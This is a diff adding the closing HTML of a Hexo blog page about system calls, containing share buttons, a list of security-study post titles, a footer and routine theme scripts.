+        <div class="bdsharebuttonbox">
+            <a href="#" class="fa fa-twitter bds_twi" data-cmd="twi" title="分享到推特"></a>
+            <a href="#" class="fa fa-weibo bds_tsina" data-cmd="tsina" title="分享到新浪微博"></a>
+            <a href="#" class="fa fa-qq bds_sqq" data-cmd="sqq" title="分享给 QQ 好友"></a>
+            <a href="#" class="fa fa-files-o bds_copy" data-cmd="copy" title="复制网址"></a>
+            <a href="#" class="fa fa fa-envelope-o bds_mail" data-cmd="mail" title="通过邮件分享"></a>
+            <a href="#" class="fa fa-weixin bds_weixin" data-cmd="weixin" title="生成文章二维码"></a>
+            <a href="#" class="fa fa-share-alt bds_more" data-cmd="more"></i></a>
+        </div>
+        <script>
+            window._bd_share_config={
+                "common":{"bdSnsKey":{},"bdText":"系统调用　| xia0ji233's Blog　","bdMini":"2","bdMiniList":false,"bdPic":"","bdStyle":"0","bdSize":"24"},"share":{}};with(document)0[(getElementsByTagName('head')[0]||body).appendChild(createElement('script')).src='http://bdimg.share.baidu.com/static/api/js/share.js?v=89860593.js?cdnversion='+~(-new Date()/36e5)];
+        </script>
+    
+
+    
+</div>
+
+
+
+
+
+
+
+    
+
+
+
+
+    <div class="scroll" id="post-nav-button">
+        
+            <a href="/2021/05/22/%E5%8A%A8%E6%80%81%E8%B0%83%E8%AF%95%E5%AD%A6%E4%B9%A0%E6%8A%A5%E5%91%8A/" title="上一篇: 动态调试工具的使用">
+                <i class="fa fa-angle-left"></i>
+            </a>
+        
+
+        <a title="文章列表"><i class="fa fa-bars"></i><i class="fa fa-times"></i></a>
+
+        
+            <a href="/2021/05/13/ret2libc%E5%AE%9E%E6%88%98/" title="下一篇: ret2libc实战">
+                <i class="fa fa-angle-right"></i>
+            </a>
+        
+    </div>
+
+    <ul class="post-list"><li class="post-list-item"><a class="post-list-link" href="/2021/08/15/babyfengshui_33c3_2016%20writeup/">babyfengshui_33c3_2016 writeup</a></li><li class="post-list-item"><a class="post-list-link" href="/2021/07/19/ret2dl_resolve/">ret2dl_resolve</a></li><li class="post-list-item"><a class="post-list-link" href="/2021/07/15/%E6%B5%99%E6%B1%9F%E7%9C%81%E8%B5%9Bpwn1%20writeup/">canary保护学习报告:通过字符串泄露canary</a></li><li class="post-list-item"><a class="post-list-link" href="/2021/06/29/SROP%E5%AD%A6%E4%B9%A0%E6%8A%A5%E5%91%8A/">SROP</a></li><li class="post-list-item"><a class="post-list-link" href="/2021/06/19/%E5%9B%BD%E8%B5%9B%E7%BA%BF%E4%B8%8B%E8%B5%9B/">2021华东南赛区国赛线下赛</a></li><li class="post-list-item"><a class="post-list-link" href="/2021/06/08/axb_2019_fmt32%20wp/">axb_2019_fmt32 wp</a></li><li class="post-list-item"><a class="post-list-link" href="/2021/06/05/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E5%88%A9%E7%94%A8/">格式化字符串漏洞利用</a></li><li class="post-list-item"><a class="post-list-link" href="/2021/05/22/cachelab/">cachelab实验报告:模拟cache的功能</a></li><li class="post-list-item"><a class="post-list-link" href="/2021/05/22/%E5%8A%A8%E6%80%81%E8%B0%83%E8%AF%95%E5%AD%A6%E4%B9%A0%E6%8A%A5%E5%91%8A/">动态调试工具的使用</a></li><li class="post-list-item"><a class="post-list-link" href="/2021/05/22/%E7%B3%BB%E7%BB%9F%E8%B0%83%E7%94%A8%E5%AD%A6%E4%B9%A0/">系统调用</a></li><li class="post-list-item"><a class="post-list-link" href="/2021/05/13/ret2libc%E5%AE%9E%E6%88%98/">ret2libc实战</a></li><li class="post-list-item"><a class="post-list-link" href="/2021/05/10/archlab%E5%AE%9E%E9%AA%8C%E6%8A%A5%E5%91%8A%EF%BC%9Ay86%E5%91%BD%E4%BB%A4%E4%BD%BF%E7%94%A8/">archlab实验报告：y86命令使用</a></li><li class="post-list-item"><a class="post-list-link" href="/2021/05/08/RSA/">RSA解密</a></li><li class="post-list-item"><a class="post-list-link" href="/2021/05/06/%E7%BA%A2%E5%B8%BD%E6%9D%AF2019%20Easyre%20wp/">红帽杯2019 easyRe</a></li><li class="post-list-item"><a class="post-list-link" href="/2021/05/01/ret2libc%E5%AD%A6%E4%B9%A0%E6%8A%A5%E5%91%8A/">ret2libc学习报告</a></li><li class="post-list-item"><a class="post-list-link" href="/2021/05/01/%E7%BB%95%E8%BF%87canary%E4%BF%9D%E6%8A%A4/">canary保护学习报告:通过字符串泄露canary</a></li><li class="post-list-item"><a class="post-list-link" href="/2021/04/30/buflab/">bufblab实验报告:32位程序缓冲区溢出攻击</a></li><li class="post-list-item"><a class="post-list-link" href="/2021/04/25/attqacklab/">attacklab实验报告:代码注入以及rop攻击</a></li><li class="post-list-item"><a class="post-list-link" href="/2021/04/19/bomblab/">bomblab实验报告:二进制安全与逆向分析</a></li></ul>
+
+
+
+
+    <script>
+        
+    </script>
+</div>
+      <footer id="footer">
+    <div class="outer">
+        <div id="footer-info">
+            <div class="footer-left">
+                <i class="fa fa-copyright"></i> 
+                2021 xia0ji233
+            </div>
+            <div class="footer-right">
+                <a href="http://hexo.io/" target="_blank" title="快速、简洁且高效的博客框架">Hexo</a>  Theme <a href="https://github.com/MOxFIVE/hexo-theme-yelee" target="_blank" title="简而不减 Hexo 双栏博客主题  v3.5">Yelee</a> by MOxFIVE <i class="fa fa-heart animated infinite pulse"></i>
+            </div>
+        </div>
+        
+            <div class="visit">
+                
+                    <span id="busuanzi_container_site_pv" style='display:none'>
+                        <span id="site-visit" title="本站到访数"><i class="fa fa-user" aria-hidden="true"></i><span id="busuanzi_value_site_uv"></span>
+                        </span>
+                    </span>
+                
+                
+                    <span>| </span>
+                
+                
+                    <span id="busuanzi_container_page_pv" style='display:none'>
+                        <span id="page-visit"  title="本页阅读量"><i class="fa fa-eye animated infinite pulse" aria-hidden="true"></i><span id="busuanzi_value_page_pv"></span>
+                        </span>
+                    </span>
+                
+            </div>
+        
+    </div>
+</footer>
+    </div>
+    
+<script data-main="/js/main.js" src="//cdn.bootcss.com/require.js/2.2.0/require.min.js"></script>
+
+    <script>
+        $(document).ready(function() {
+            var iPad = window.navigator.userAgent.indexOf('iPad');
+            if (iPad > -1 || $(".left-col").css("display") === "none") {
+                var bgColorList = ["#9db3f4", "#414141", "#e5a859", "#f5dfc6", "#c084a0", "#847e72", "#cd8390", "#996731"];
+                var bgColor = Math.ceil(Math.random() * (bgColorList.length - 1));
+                $("body").css({"background-color": bgColorList[bgColor], "background-size": "cover"});
+            }
+            else {
+                var backgroundnum = 5;
+                var backgroundimg = "url(/background/bg-x.jpg)".replace(/x/gi, Math.ceil(Math.random() * backgroundnum));
+                $("body").css({"background": backgroundimg, "background-attachment": "fixed", "background-size": "cover"});
+            }
+        })
+    </script>
+
+
+
+
+
+<div class="scroll" id="scroll">
+    <a href="#" title="返回顶部"><i class="fa fa-arrow-up"></i></a>
+    <a href="#comments" onclick="load$hide();" title="查看评论"><i class="fa fa-comments-o"></i></a>
+    <a href="#footer" title="转到底部"><i class="fa fa-arrow-down"></i></a>
+</div>
+<script>
+    // Open in New Window
+    
+        var oOpenInNew = {
+            
+            
+            
+            
+            
+            
+             archives: ".archive-article-title", 
+             miniArchives: "a.post-list-link", 
+            
+             friends: "#js-friends a", 
+             socail: ".social a" 
+        }
+        for (var x in oOpenInNew) {
+            $(oOpenInNew[x]).attr("target", "_blank");
+        }
+    
+</script>
+
+    <script>
+        var originTitle = document.title;
+        var titleTime;
+        document.addEventListener("visibilitychange", function() {
+            if (document.hidden) {
+                document.title = "(つェ⊂) 我藏好了哦~ " + originTitle;
+                clearTimeout(titleTime);
+            }
+            else {
+                document.title = "(*´∇｀*) 被你发现啦~ " + originTitle;
+                titleTime = setTimeout(function() {
+                    document.title = originTitle;
+                }, 2000);
+            }
+        })
+    </script>
+
+<script async src="https://dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js">
+</script>
+  </div>
+</body>
+</html>
